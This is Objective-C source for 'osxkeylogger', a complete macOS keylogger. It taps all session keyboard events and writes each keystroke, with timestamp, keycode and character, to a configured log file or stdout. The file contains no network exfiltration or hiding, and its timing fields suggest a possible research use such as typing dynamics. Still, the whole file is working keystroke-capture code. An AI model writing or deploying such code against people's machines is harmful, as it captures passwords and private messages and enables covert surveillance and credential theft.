//
//  main.m
//  osxkeylogger
//
//  Created by Juha Koivisto on 27.2.2011.
//	Licence: LGPL
//

#import <ApplicationServices/ApplicationServices.h>
#import <mach/mach_time.h>
#import <Carbon/Carbon.h>


void readLogFileName(char* pLogFileName2){
	NSBundle*	mainBundle;
	NSString*	logFileNameNS;
	int fnLen;
	
	// memory management, construct pool
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	// mainBundle == Info.plist 
	mainBundle = [NSBundle mainBundle];
	
	// read Log file name
	logFileNameNS = [mainBundle objectForInfoDictionaryKey:@"logFile"];
	
	// to cString
	const char *pLocalLogFileName = [logFileNameNS UTF8String];
	
	// copy it to correct pointer (TODO: this could be smarter)
	fnLen = strlen(pLocalLogFileName) + 1;
	strncpy(pLogFileName2, pLocalLogFileName, sizeof(char)*fnLen);
	
	// free memory
	[pool drain];
}



FILE* openLogFile()
{
	FILE*		pLogFile;
	char      pLogFileName[65536];
	
	readLogFileName(pLogFileName);
	
	if (pLogFileName[0] == 's' && 
		pLogFileName[1] == 't' &&
		pLogFileName[2] == 'd' &&
		pLogFileName[3] == 'o' &&
		pLogFileName[4] == 'u' &&
		pLogFileName[5] == 't'){
		pLogFile = stdout;
	}
	else {
		pLogFile = fopen(pLogFileName, "a");
	}
	
	return pLogFile;
}

CGEventRef recordKeysCallback(CGEventTapProxy	proxy, 
							  CGEventType		type,  
							  CGEventRef		event, 
							  void*				pLogFile) 
{
	// only key up and key down
	// you can do this also with mask
	if (type != kCGEventKeyDown)
	{
		if (type != kCGEventKeyUp) return event;
	}
	
	unsigned long long	currentTime; 
	long long			keycode;
	UniChar				uc[10];
	UniCharCount		ucc;
	
	currentTime = mach_absolute_time();
	keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
	CGEventKeyboardGetUnicodeString(event,10,&ucc,uc);
	
	if ((uc[0] < 128) && (uc[0] >= 41)){
			fprintf((FILE*)pLogFile, 
					"<key><time>%llu</time><type>%u</type><keycode>%llu</keycode><unichar>%04x</unichar><ascii>%c</ascii></key>\n",
					(unsigned long long)	currentTime,
					(unsigned int)			type,
					(long long)				keycode,
					uc[0],
					uc[0]);
		
	}
	else { // disable rest
		fprintf((FILE*)pLogFile, 
				"<key><time>%llu</time><type>%u</type><keycode>%llu</keycode><unichar>%04x</unichar></key>\n",
				(unsigned long long)		currentTime,
				(unsigned int)			type,
				(long long)				keycode,
				uc[0]);
	}

	return event; 
}

void createEventListenerLoopSourceAndRun(FILE* pLogFile)
{
	CFMachPortRef		eventTap;  
	CFRunLoopSourceRef	runLoopSource; 
	
	// create event listener
	eventTap = CGEventTapCreate(kCGSessionEventTap, 
								kCGHeadInsertEventTap, 
								0, 
								kCGEventMaskForAllEvents, 
								recordKeysCallback,   // <-- this is the function called
								(void*)pLogFile);
	
	// wrap event listener to loopable form
	runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, 
												  eventTap, 
												  0);
	// add wrapped listener to loop
	CFRunLoopAddSource(CFRunLoopGetCurrent(), 
					   runLoopSource, 
					   kCFRunLoopCommonModes);
	
	// enable event tab
	CGEventTapEnable(eventTap, 
					 true);
	
	// run event tab
	CFRunLoopRun();
}

int main (int argc, const char * argv[]) {
	
	FILE* pLogFile;
	pLogFile = openLogFile();
	createEventListenerLoopSourceAndRun(pLogFile);
    return 0;
}

